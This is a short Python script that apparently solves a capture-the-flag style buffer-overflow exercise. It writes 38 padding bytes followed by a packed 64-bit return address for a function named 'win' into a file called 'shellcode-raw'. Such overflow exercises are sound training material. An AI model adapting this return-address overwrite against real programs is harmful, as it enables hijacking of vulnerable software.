#!/usr/bin/env python3

from struct import pack

payload = b'a' * 38

# The address of the function win
payload += pack("<Q", 0x7fffffffe520)

with open("shellcode-raw", "ab") as f:
    f.write(payload)